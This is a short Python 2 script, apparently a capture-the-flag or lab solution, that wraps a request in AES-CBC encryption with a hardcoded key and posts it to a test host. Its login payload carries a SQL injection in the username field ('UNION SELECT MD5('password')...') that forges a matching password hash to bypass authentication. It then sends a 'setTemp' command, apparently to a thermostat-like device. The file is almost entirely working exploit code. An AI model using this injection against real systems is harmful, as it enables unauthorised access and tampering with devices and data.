from Crypto.Cipher import AES
from Crypto import Random
import base64, json, requests

key = '8O.j\x1a\x05\xe5";\x80\xe9`\xa0\xa6Pt' # 384f2e6a1a05e5223b80e960a0a65074

def pad(data):
	dlen = 16 - (len(data) % 16)
	data += chr(dlen) * dlen
	return data

def unpad(data):
	padding = data[-1]
	pval = ord(padding)
	return data[:-pval]

def build(obj):
	data = json.dumps(obj)
	rand = Random.new()
	iv = rand.read(16)
	cipher = AES.new(key, AES.MODE_CBC, iv)
	return base64.encodestring(iv + cipher.encrypt(pad(data))).replace('\n', '')

def dec(payload):
	payload = base64.decodestring(payload)
	iv = payload[:16]
	cipher = AES.new(key, AES.MODE_CBC, iv)
	return json.loads(unpad(cipher.decrypt(payload[16:])))

payload = dict(
	username="' UNION SELECT MD5('password') FROM users WHERE 1='1", 
	password='password', 
	cmd='setTemp', 
	temp=70
)
print dec(requests.post('http://testhost/', data=dict(d=build(payload))).text)
